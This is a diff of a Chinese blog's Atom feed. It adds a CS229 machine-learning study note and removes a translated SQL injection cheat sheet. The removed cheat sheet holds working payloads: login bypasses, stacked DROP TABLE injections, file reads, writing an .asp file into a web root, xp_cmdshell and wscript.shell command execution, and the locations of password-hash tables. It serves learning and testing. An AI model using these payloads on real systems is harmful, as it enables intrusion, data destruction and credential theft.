@@ -4,13 +4,146 @@
   <title><![CDATA[雪地]]></title>
   <link href="http://yinzo.github.io/atom.xml" rel="self"/>
   <link href="http://yinzo.github.io/"/>
-  <updated>2017-03-19T18:46:41+08:00</updated>
+  <updated>2017-05-14T16:59:35+08:00</updated>
   <id>http://yinzo.github.io/</id>
   <author>
     <name><![CDATA[]]></name>
     
   </author>
   <generator uri="http://www.mweb.im/">MWeb</generator>
+  
+  <entry>
+    <title type="html"><![CDATA[CS229 学习笔记 Part 1]]></title>
+    <link href="http://yinzo.github.io/14947523529684.html"/>
+    <updated>2017-05-14T16:59:12+08:00</updated>
+    <id>http://yinzo.github.io/14947523529684.html</id>
+    <content type="html"><![CDATA[
+<p>此笔记为我的 CS229 的学习笔记之一，由 Andrew Ng 的 CS229 Lecture notes 和 课堂录像整理而来。用于记录所学到的内容。记录顺序重新编排过，并非是课程原本的教学顺序，并且省略了课程中的一些推导过程，所以适合学习后整理备忘使用，不适合用于同步辅助学习。</p>
+
+<h2 id="toc_0">广义线性模型 GLM (Generalized Linear Models)</h2>
+
+<p>广义线性模型是所学到的 Linear Regression 以及 Logistic Regression 的推广形式（更准确的说，这两种模型都属于 GLM 的特殊情况）。它有三个关键假设(Assumptions)构成:</p>
+
+<ol>
+<li>\(y \mid x;\theta\sim ExponentialFamily(\eta)\) ：对于固定的参数 \(\theta\) 以及给定 \(x\)， \(y\) 的分布服从某一指数分布族（如高斯分布、伯努利分布、Softmax分布）</li>
+<li>对于给定的 \(x\) ，目标是预测 \(T(y)\) 的值。换一种说法就是，我们定义假设函数 \(h(x) = E[y\mid x]\)</li>
+<li>natural parameter \(\eta\) 和 输入 \(x\) 是线性相关的， \(\eta = \theta^ \mathrm{ T } x\) （其中，当输入 \(x\) 和 \(\eta\) 是向量的时候， \(\eta_i = \theta_i^ \mathrm{T}x\)）</li>
+</ol>
+
+<span id="more"></span><!-- more -->
+
+<p>以上三个假设，一般只有第一个需要我们决定所使用的分布，其他两个假设都是直接定义。关键的地方来了，通过选择不同的<em>指数分布族</em>分布，我们能够得到不同的模型：</p>
+
+<ul>
+<li>高斯分布，则得到 Linear Regression</li>
+<li>伯努利分布，则得到 Logistic Regression</li>
+<li>Softmax 分布，得到 Softmax Regression</li>
+</ul>
+
+<p>其中，Lenear Regression 为回归模型 (regression)， Logistic Regression 和 Softmax Regression 都是分类模型 (classification)。</p>
+
+<p>则我猜测，是否根据所假设的分布是离散分布还是连续分布，分别能够得到分类模型和回归模型呢？有待后续的学习验证。</p>
+
+<h3 id="toc_1">具体步骤</h3>
+
+<ol>
+<li>假设 \(y\) 服从的分布，并将所假设的分布化为标准的指数分布族标准形式：\[ p(y;\eta) = b(y)\exp(\eta^\mathrm{T}T(y)-a(\eta))\]</li>
+<li>使用 \(\eta\) 表示出 \(E[y\mid x;\theta]\)，则我们得到了使用 \(\eta\) 表示的假设函数 \(h_\theta(\eta)\)</li>
+<li>根据假设3，\(\eta = \theta^ \mathrm{ T } x\)，直接代入假设函数，得到 \(h_\theta(x)\)</li>
+</ol>
+
+<p>之后：</p>
+
+<ol>
+<li>通过得到的假设函数，我们能够定义出代价函数 (Cost function) 或 似然函数 (likelihood) </li>
+<li>通过优化方法如梯度下降、牛顿法，以最小化代价函数或者最大化似然函数，得到最优的 \(\theta\) 值。</li>
+</ol>
+
+<h2 id="toc_2">优化方法</h2>
+
+<h3 id="toc_3">梯度下降法</h3>
+
+<p>包括以下三种子类：</p>
+
+<ul>
+<li>Batch Gradient Descent </li>
+<li>Mini-batch Gradient Descent</li>
+<li>Stochastic Gradient Descent</li>
+</ul>
+
+<p>三种方法的主要区别在于，每一步优化所使用的样本数量大小：</p>
+
+<ul>
+<li>Batch 使用<strong>全部</strong>样本计算平均梯度后才进行一步更新；</li>
+<li>Mini-batch 使用<strong>一小部分</strong>样本计算平均梯度就进行一步更新；</li>
+<li>Stochastic 使用<strong>一个</strong>样本，计算梯度，进行更新</li>
+</ul>
+
+<h3 id="toc_4">牛顿法</h3>
+
+<p>牛顿法用于寻找函数零点位置的优化方法，使用函数的导数（梯度）来计算参数的变化量，从而更新参数</p>
+
+<p>由于我们需要寻找函数的极大值（极小值），则我们可以通过牛顿法寻找原函数的一阶导数的零点，将优化问题转化为寻找零点问题，以此来寻找原函数的极大值（极小值）。</p>
+
+<p>牛顿法在二维的参数更新公式为：</p>
+
+<p>\[\theta := \theta - \Delta\]</p>
+
+<p>\[\Delta = \frac{f^\prime(\theta)}{f^{\prime\prime}(\theta)}\]</p>
+
+<p>多维时，参数更新公式变为： </p>
+
+<p>\[\theta := \theta - H^{-1}\nabla_\theta \ell(\theta)\]</p>
+
+<h2 id="toc_5">Linear Regression</h2>
+
+<p>简单的模型介绍就不说了，只记录这门课程给我额外学习到的一些知识点。</p>
+
+<p>首先是 Linear Regression 使用的是最小平方误差法 LMS 来进行函数优化并寻找最优 \(\theta\) 值的。在我第一次学习到这个方法的时候，仅仅是觉得这个误差函数很有道理，感觉能说得过去，并没有理解其背后的理论基础。</p>
+
+<p>Andrew Ng 使用概率学上的解释，告诉了我，为什么使用最小平方误差法。</p>
+
+<p>我们使用假设函数 \(h(x) = \theta^\mathrm{T}x^{(i)}\) 来作为给定输入 \(x\) 时，对 \(y\) 的预测，则我们可以得到这样一个等式</p>
+
+<p>\[y^{(i)} = \theta^\mathrm{T}x^{(i)} + \epsilon^{(i)}\]</p>
+
+<p>\(\epsilon^{(i)}\) 是误差项，包括了未被找到的特征或随机噪声。此时，我们假设：</p>
+
+<ol>
+<li>误差都是独立同分布的</li>
+<li>误差项符合高斯分布</li>
+</ol>
+
+<p>则有\(\epsilon^{(i)}\sim \cal{N}(0,\sigma^2) \)，即 \(y^{(i)} - \theta^\mathrm{T}x^{(i)}\sim \cal{N}(0,\sigma^2) \)</p>
+
+<p>省略一部分推导，我们能够得到对数似然函数 </p>
+
+<p>\[\ell (\theta) = m\log \frac{1}{\sqrt{2\pi}\sigma} - \frac{1}{\sigma^2}\cdot\frac{1}{2}\sum_{i=1}^{m} (y^{(i)} - \theta^\mathrm{T}x^{(i)})^2\]</p>
+
+<p>则当我们最大化对数似然函数时，即最小化 </p>
+
+<p>\[\frac{1}{2}\sum_{i=1}^{m}(y^{(i)} - \theta^\mathrm{T}x^{(i)})^2\] </p>
+
+<p>即最小化平方误差。</p>
+
+<p>最终我们得到结论：当我们对数据的分布进行以上假设时，最大化对数似然函数相当于最小化平方误差。</p>
+
+<h3 id="toc_6">Locally weighted linear regression</h3>
+
+<p>这是一种 Linear Regression 的特殊形式，它在误差函数中增加了一项权重，变为\(\sum_i w^{(i)}(y^{(i)} - \theta^\mathrm{T}x^{(i)})^2\)</p>
+
+<p>其中 \(w^{(i)}\) 就是非负权重，对于需要重点拟合的区域 \(w^{(i)}\) 会比较大。\(w^{(i)}\) 并不需要满足和为1的约束，因为他不是概率分布，只是单纯的惩罚项。</p>
+
+<p>通常来说，对于权重 \(w^{(i)}\) 的选择，我们使用以下函数</p>
+
+<p>\[w^{(i)} = \exp(-\frac{(x^{(i)} - x)^2}{2\tau^2})\]</p>
+
+<p>需要注意的是，这个函数和高斯分布没有关系，仅仅是常规的钟形函数而已。参数 \(\tau\) 影响了当远离所求点 \(x\) 时权值下降的速度。</p>
+
+<p>则对于权重较大的区域，所求得的曲线拟合程度较高。这一方法在预测的时候，通常将待预测区域的权重提高，然后重新拟合曲线。所以每一次预测都需要重新拟合曲线，使得它在训练样本较大时效率比较低。</p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[原始模型优化笔记]]></title>
@@ -2518,981 +2651,6 @@ SYSAUX
 </code></pre>
 
 <p>即可。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SQL注入速查表]]></title>
-    <link href="http://yinzo.github.io/14608288854459.html"/>
-    <updated>2016-04-17T01:48:05+08:00</updated>
-    <id>http://yinzo.github.io/14608288854459.html</id>
-    <content type="html"><![CDATA[
-<p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p>
-
-<p><small><em>文档版本：1.4</em></small></p>
-
-<h2 id="toc_0">关于SQL注入速查表</h2>
-
-<p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p>
-
-<p>样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p>
-
-<span id="more"></span><!-- more -->
-
-<ul>
-<li>M:    MySQL</li>
-<li>S: SQL Server</li>
-<li>P:    PostgreSQL</li>
-<li>O:    Oracle</li>
-<li>+: (大概)其他所有数据库</li>
-</ul>
-
-<p><em>例子</em>：</p>
-
-<ul>
-<li>(MS) 代表 : MySQL 和 SQL Server 等</li>
-<li>(M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</li>
-</ul>
-
-<h2 id="toc_1">目录</h2>
-
-<ol>
-<li>关于SQL注入速查表</li>
-<li>语法参考，攻击样例以及注入小技巧
-
-<ol>
-<li>行间注释
-
-<ol>
-<li>使用了行间注释的SQL注入攻击样例</li>
-</ol></li>
-<li>行内注释
-
-<ol>
-<li>使用了行内注释的注入攻击样例</li>
-<li>MySQL版本探测攻击样例</li>
-</ol></li>
-<li>堆叠查询(Stacking Queries)
-
-<ol>
-<li>支持堆叠查询的语言/数据库</li>
-<li>关于MySQL和PHP</li>
-<li>堆叠注入攻击样例</li>
-</ol></li>
-<li>If语句
-
-<ol>
-<li>MySQL的If语句</li>
-<li>SQL Server的If语句</li>
-<li>使用了If语句的注入攻击样例</li>
-</ol></li>
-<li>整数(Integers)的使用</li>
-<li>字符串操作
-
-<ol>
-<li>字符串的串联</li>
-</ol></li>
-<li>没有引号的字符串
-
-<ol>
-<li>使用了16进制的注入攻击样例</li>
-</ol></li>
-<li>字符串异化(Modification)与联系</li>
-<li>Union注入
-
-<ol>
-<li>UNION-语言问题处理</li>
-</ol></li>
-<li>绕过登陆界面(SMO+)</li>
-<li>绕过检查MD5哈希的登陆界面
-
-<ol>
-<li>绕过MD5哈希检查的例子(MSP)</li>
-</ol></li>
-<li>基于错误(Error Based)-探测字段名
-
-<ol>
-<li>使用<code>HAVING</code>来探测字段名(S)</li>
-<li>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</li>
-</ol></li>
-<li>数据类型、UNION、之类的
-
-<ol>
-<li>获取字段类型</li>
-</ol></li>
-<li>简单的注入(MSO+)</li>
-<li>有用的函数、信息收集、内置程序、大量注入笔记
-
-<ol>
-<li><code>@@version</code>(MS)</li>
-<li>文件插入(Bulk Insert)(S)</li>
-<li>BCP(S)</li>
-<li>SQL Server的VBS/WSH(S)</li>
-<li>执行系统命令，xp_cmdshell(S)</li>
-<li>SQL Server中的一些特殊的表(S)</li>
-<li>SQL Server的其它内置程序(S)</li>
-<li>大量MSSQL笔记</li>
-<li>使用LIMIT(M)或ORDER(MSO)的注入</li>
-<li>关掉SQL Server(S)</li>
-</ol></li>
-<li>在SQL Server 2005中启用xp_cmdshell</li>
-<li>探测SQL Server数据库的结构(S)
-
-<ol>
-<li>获取用户定义表</li>
-<li>获取字段名</li>
-</ol></li>
-<li>移动记录(Moving records)(S)</li>
-<li>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</li>
-<li>盲注
-
-<ol>
-<li>关于盲注</li>
-<li>实战中的盲注实例</li>
-</ol></li>
-<li>延时盲注
-
-<ol>
-<li><code>WAITFOR DELAY [time]</code>(S)</li>
-<li>实例</li>
-<li><code>BENCHMARK()</code>(M)</li>
-<li>实例</li>
-<li><code>pg_sleep(seconds)</code>(P)</li>
-</ol></li>
-<li>掩盖痕迹
-
-<ol>
-<li><code>-sp_password log bypass</code>(S)</li>
-</ol></li>
-<li>注入测试</li>
-<li>一些其他的MySQL笔记
-
-<ol>
-<li>MySQL中好用的函数</li>
-</ol></li>
-<li>SQL注入的高级使用
-
-<ol>
-<li>强制SQL Server来得到NTLM哈希</li>
-<li>Bulk insert UNC共享文件 (S) </li>
-</ol></li>
-</ol></li>
-<li>待办事项 / 联系方式 / 帮助</li>
-</ol>
-
-<h2 id="toc_2">语法参考，攻击样例以及注入小技巧</h2>
-
-<h3 id="toc_3">行间注释</h3>
-
-<p><strong>注释掉查询语句的其余部分</strong><br/>
-行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p>
-
-<ul>
-<li><p><code>--</code>(SM)</p>
-
-<p><code>DROP sampletable;--</code></p></li>
-<li><p><code>#</code>(M)</p>
-
-<p><code>DROP sampletable;#</code></p></li>
-</ul>
-
-<h4 id="toc_4">使用了行间注释的SQL注入攻击样例</h4>
-
-<blockquote>
-<p>用户名:<code>admin&#39;--</code></p>
-</blockquote>
-
-<ul>
-<li>构成语句:<code>SELECT * FROM members WHERE username = &#39;admin&#39;--&#39; AND password = &#39;password&#39;</code>
-这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li>
-</ul>
-
-<h3 id="toc_5">行内注释</h3>
-
-<p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于<strong>绕过过滤</strong>，移除空格，混淆，或探测数据库版本。</p>
-
-<ul>
-<li><code>/*注释内容*/</code>(SM)
-
-<ul>
-<li><code>DROP/*comment*/sampletable</code></li>
-<li><code>DR/**/OP/*绕过过滤*/sampletable</code></li>
-<li><code>SELECT/*替换空格*/password/**/FROM/**/Members</code></li>
-</ul></li>
-<li><p><code>/*! MYSQL专属 */</code> (M) </p>
-
-<p>这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。<br/>
-<code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p></li>
-</ul>
-
-<h4 id="toc_6">使用了行内注释的注入攻击样例</h4>
-
-<blockquote>
-<p>ID:<code>10; DROP TABLE members /*</code></p>
-</blockquote>
-
-<p>简单地摆脱了处理后续语句的麻烦，同样你可以使用<code>10; DROP TABLE members --</code></p>
-
-<h4 id="toc_7">MySQL版本探测攻击样例</h4>
-
-<blockquote>
-<p><code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p>
-</blockquote>
-
-<p>如果MySQL的版本高于<strong>3.23.02</strong>，会抛出一个<code>division by 0 error</code></p>
-
-<blockquote>
-<p>ID:<code>/*!32302 10*/</code></p>
-
-<p>ID:<code>10</code></p>
-</blockquote>
-
-<p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p>
-
-<h3 id="toc_8">堆叠查询(Stacking Queries)</h3>
-
-<p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p>
-
-<ul>
-<li><code>;</code>(S)
-<code>SELECT * FROM members; DROP members--</code>
-结束一个查询并开始一个新的查询</li>
-</ul>
-
-<h4 id="toc_9">支持堆叠查询的语言/数据库</h4>
-
-<p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知<br/>
-<img src="http://ww2.sinaimg.cn/large/7d52f1ffgw1euwiy9impsj20dn03sgls.jpg" alt="支持堆叠查询的语言/数据库"/></p>
-
-<h4 id="toc_10">关于MySQL和PHP</h4>
-
-<p>阐明一些问题。</p>
-
-<p><strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？</p>
-
-<p><em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p>
-
-<h4 id="toc_11">堆叠注入攻击样例</h4>
-
-<blockquote>
-<p>ID:<code>10;DROP members --</code></p>
-</blockquote>
-
-<p>构成语句：<code>SELECT * FROM products WHERE id = 10; DROP members--</code></p>
-
-<p>这在执行完正常查询之后将会执行DROP查询。</p>
-
-<h3 id="toc_12">If语句</h3>
-
-<p>根据If语句得到响应。这是<strong>盲注(Blind SQL Injection)的关键之一</strong>，同样也能简单而<strong>准确地</strong>进行一些测试。</p>
-
-<h4 id="toc_13">MySQL的If语句</h4>
-
-<ul>
-<li><p><code>IF(condition,true-part,false-part)</code>(M)</p>
-
-<blockquote>
-<p><code>SELECT IF (1=1,&#39;true&#39;,&#39;false&#39;)</code></p>
-</blockquote></li>
-</ul>
-
-<h4 id="toc_14">SQL Server的If语句</h4>
-
-<ul>
-<li><p><code>IF condition true-part ELSE false-part</code>(S)</p>
-
-<blockquote>
-<p><code>IF (1=1) SELECT &#39;true&#39; ELSE SELECT &#39;false&#39;</code></p>
-</blockquote></li>
-</ul>
-
-<h4 id="toc_15">使用了If语句的注入攻击样例</h4>
-
-<blockquote>
-<p><code>if ((select user) = &#39;sa&#39; OR (select user) = &#39;dbo&#39;) select 1 else select 1/0</code>(S)</p>
-</blockquote>
-
-<p>如果当前用户不是<strong>&ldquo;sa&quot;或者&quot;dbo&rdquo;</strong>,就会抛出一个<strong><code>divide by zero error</code></strong>。</p>
-
-<h3 id="toc_16">整数(Integers)的使用</h3>
-
-<p>对于绕过十分有用，比如<strong>magic_quotes() 和其他类似过滤器</strong>，甚至是各种WAF。</p>
-
-<ul>
-<li><p><code>0xHEXNUMBER</code>(SM)</p>
-
-<p>(HEXNUMBER:16进制数）<br/>
-你能这样使用16进制数：</p>
-
-<ul>
-<li><p><code>SELECT CHAR(0x66)</code>(S)</p></li>
-<li><p><code>SELECT 0x5045</code>(M) (这不是一个整数，而会是一个16进制字符串）</p></li>
-<li><p><code>SELECT 0x50 + 0x45</code>(M) (现在这是整数了)</p></li>
-</ul></li>
-</ul>
-
-<h3 id="toc_17">字符串操作</h3>
-
-<p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p>
-
-<h4 id="toc_18">字符串的串联</h4>
-
-<ul>
-<li><p><code>+</code>(S)</p>
-
-<p><code>SELECT login + &#39;-&#39; + password FROM members</code></p></li>
-<li><p><code>||</code> (*MO) </p>
-
-<p><code>SELECT login || &#39;-&#39; || password FROM members</code></p></li>
-</ul>
-
-<p>*<strong>关于MySQL的&quot;||&ldquo;</strong><br/>
-这个仅在ANSI模式下的MySQL执行，其他情况下都会当成&#39;逻辑操作符&#39;并返回一个0。更好的做法是使用<code>CONCAT()</code>函数。</p>
-
-<ul>
-<li><p><code>CONCAT(str1, str2, str3, ...)</code>(M)</p>
-
-<p>连接参数里的所有字符串<br/>
-例：<code>SELECT CONCAT(login, password) FROM members</code></p></li>
-</ul>
-
-<h3 id="toc_19">没有引号的字符串</h3>
-
-<p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用<code>CHAR()</code>(MS)和<code>CONCAT()</code>(M)来生成没有引号的字符串</p>
-
-<ul>
-<li><p><code>0x457578</code> (M) - 16进制编码的字符串</p>
-
-<p><code>SELECT 0x457578</code></p>
-
-<p>这在MySQL中会被当做字符串处理</p></li>
-<li><p>在MySQL中使用16进制字符串的一个简单方式：<br/>
-<code>SELECT CONCAT(&#39;0x&#39;,HEX(&#39;c:\\boot.ini&#39;))</code></p></li>
-<li><p>在MySQL中使用<code>CONCAT()</code>函数：<br/>
-<code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M) </p>
-
-<p>这会返回&#39;KLM&#39;</p></li>
-<li><p><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S) </p>
-
-<p>这会返回&#39;KLM&#39;</p></li>
-</ul>
-
-<h4 id="toc_20">使用了16进制的注入攻击样例</h4>
-
-<ul>
-<li><p><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code> (M) </p>
-
-<p>这会显示<strong>c:\boot.ini</strong>的内容</p></li>
-</ul>
-
-<h3 id="toc_21">字符串异化(Modification)与联系</h3>
-
-<ul>
-<li><p><code>ASCII()</code> (SMP) </p>
-
-<p>返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。</p>
-
-<p>例：<code>SELECT ASCII(&#39;a&#39;)</code></p></li>
-<li><p><code>CHAR()</code> (SM) </p>
-
-<p>把整数转换为对应ASCII码的字符</p>
-
-<p>例：<code>SELECT CHAR(64)</code></p></li>
-</ul>
-
-<h3 id="toc_22">Union注入</h3>
-
-<p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。<br/>
-<code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members</code></p>
-
-<p>这会把news表和members表的内容合并返回。</p>
-
-<p>另一个例子：<br/>
-<code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code></p>
-
-<h4 id="toc_23">UNION-语言问题处理</h4>
-
-<p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p>
-
-<ul>
-<li><p>使用 <code>COLLATE SQL_Latin1_General_Cp1254_CS_AS</code>(S)</p>
-
-<p>或者其它的什么语句，具体的自己去查SQL Server的文档。<br/>
-例：<code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></p></li>
-<li><p><code>Hex()</code>(M)</p>
-
-<p>百试百灵~</p></li>
-</ul>
-
-<h3 id="toc_24">绕过登陆界面(SMO+)</h3>
-
-<p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p>
-
-<ul>
-<li><code>admin&#39; --</code></li>
-<li><code>admin&#39; #</code></li>
-<li><code>admin&#39;/*</code></li>
-<li><code>&#39; or 1=1--</code></li>
-<li><code>&#39; or 1=1#</code></li>
-<li><code>&#39; or 1=1/*</code></li>
-<li><code>&#39;) or &#39;1&#39;=&#39;1--</code></li>
-<li><code>&#39;) or (&#39;1&#39;=&#39;1--</code></li>
-<li>&hellip;.</li>
-<li>以不同的用户登陆 (SM*) 
-<code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code></li>
-</ul>
-
-<p>*<em>旧版本的MySQL不支持union</em></p>
-
-<h3 id="toc_25">绕过检查MD5哈希的登陆界面</h3>
-
-<p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p>
-
-<h4 id="toc_26">绕过MD5哈希检查的例子(MSP)</h4>
-
-<blockquote>
-<p>用户名：<code>admin</code></p>
-
-<p>密码：<code>1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;,&#39;81dc9bdb52d04dc20036dbd8313ed055</code></p>
-</blockquote>
-
-<p>其中<code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p>
-
-<h3 id="toc_27">基于错误(Error Based)-探测字段名</h3>
-
-<h4 id="toc_28">使用<code>HAVING</code>来探测字段名(S)</h4>
-
-<ul>
-<li><code>&#39; HAVING 1=1 --</code></li>
-<li><code>&#39; GROUP BY table.columnfromerror1 HAVING 1=1 --</code></li>
-<li><code>&#39; GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --</code></li>
-<li>……</li>
-<li><code>&#39; GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 --</code></li>
-<li>直到它不再报错，就算搞定了</li>
-</ul>
-
-<h4 id="toc_29">在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</h4>
-
-<p>通过ORDER BY来探测字段数能够加快union注入的速度。</p>
-
-<ul>
-<li><code>ORDER BY 1--</code></li>
-<li><code>ORDER BY 2--</code></li>
-<li>……</li>
-<li><code>ORDER BY N--</code> </li>
-<li>一直到它报错为止，最后一个成功的数字就是字段数。</li>
-</ul>
-
-<h3 id="toc_30">数据类型、UNION、之类的</h3>
-
-<p><strong>提示：</strong></p>
-
-<ul>
-<li>经常给<strong>UNION</strong>配上<strong>ALL</strong>使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li>
-<li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用<code>-1</code>或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li>
-<li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强
-
-<ul>
-<li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li>
-</ul></li>
-</ul>
-
-<h4 id="toc_31">获取字段类型</h4>
-
-<ul>
-<li><p><code>&#39; union select sum(columntofind) from users--</code> (S) </p>
-
-<pre><code>Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39; 
-[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 
-</code></pre>
-
-<p>如果没有返回错误说明字段是<strong>数字类型</strong></p></li>
-<li><p>同样的，你可以使用<code>CAST()</code>和<code>CONVERT()</code></p>
-
-<ul>
-<li>  <code>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</code></li>
-</ul></li>
-<li><p><code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code></p>
-
-<p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</p></li>
-<li><p><code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code></p>
-
-<p>没报错 – 第一个字段是<code>integer</code>类型。</p></li>
-<li><p><code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --</code></p>
-
-<p>报错 – 第二个字段不是<code>integer</code>类型</p></li>
-<li><p><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code></p>
-
-<p>没报错 – 第二个字段是<code>string</code>类型。</p></li>
-<li><p><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code></p>
-
-<p>报错 – 第三个字段不是<code>integer</code> </p></li>
-<li><p>……</p>
-
-<pre><code>Microsoft OLE DB Provider for SQL Server error &#39;80040e07&#39; 
-Explicit conversion from data type int to image is not allowed.
-</code></pre></li>
-</ul>
-
-<p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p>
-
-<h3 id="toc_32">简单的注入(MSO+)</h3>
-
-<p><code>&#39;; insert into users values( 1, &#39;hax0r&#39;, &#39;coolpass&#39;, 9 )/*</code></p>
-
-<h3 id="toc_33">有用的函数、信息收集、内置程序、大量注入笔记</h3>
-
-<h4 id="toc_34"><code>@@version</code>(MS)</h4>
-
-<p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p>
-
-<p><code>INSERT INTO members(id, user, pass) VALUES(1, &#39;&#39;+SUBSTRING(@@version,1,10) ,10)</code></p>
-
-<h4 id="toc_35">文件插入(Bulk Insert)(S)</h4>
-
-<p>把文件内容插入到表中。如果你不知道应用目录你可以去<strong>读取IIS metabase file</strong>(<em>仅IIS 6</em>)(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>)然后在里面找到应用目录。</p>
-
-<ol>
-<li>新建一个表foo(<code>line varchar(8000)</code>)</li>
-<li><code>BULK INSERT foo FROM &#39;c:\inetpub\wwwroot\login.asp&#39;</code></li>
-<li>DROP了临时表，重复另一个文件</li>
-</ol>
-
-<h4 id="toc_36">BCP(S)</h4>
-
-<p>写入文件。这个功能需要登录<br/>
-<code>bcp &quot;SELECT * FROM test..foo&quot; queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p>
-
-<h4 id="toc_37">SQL Server的VBS/WSH(S)</h4>
-
-<p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</p>
-
-<pre><code>declare @o int 
-exec sp_oacreate &#39;wscript.shell&#39;, @o out 
-exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39;
-</code></pre>
-
-<blockquote>
-<p>Username: <code>&#39;; declare @o int exec sp_oacreate &#39;wscript.shell&#39;, @o out exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39; --</code></p>
-</blockquote>
-
-<h4 id="toc_38">执行系统命令，xp_cmdshell(S)</h4>
-
-<p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</p>
-
-<p><code>EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;</code></p>
-
-<p>用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</p>
-
-<p><code>EXEC master.dbo.xp_cmdshell &#39;ping &#39;</code></p>
-
-<p>如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p>
-
-<h4 id="toc_39">SQL Server中的一些特殊的表(S)</h4>
-
-<ul>
-<li><p>Error Messages</p>
-
-<p><code>master..sysmessages</code></p></li>
-<li><p>Linked Servers </p>
-
-<p><code>master..sysservers</code></p></li>
-<li><p>Password (2000和2005版本的都能被破解，这俩的加密算法很相似) </p>
-
-<p>SQL Server 2000: masters..sysxlogins </p>
-
-<p>SQL Server 2005 : sys.sql_logins </p></li>
-</ul>
-
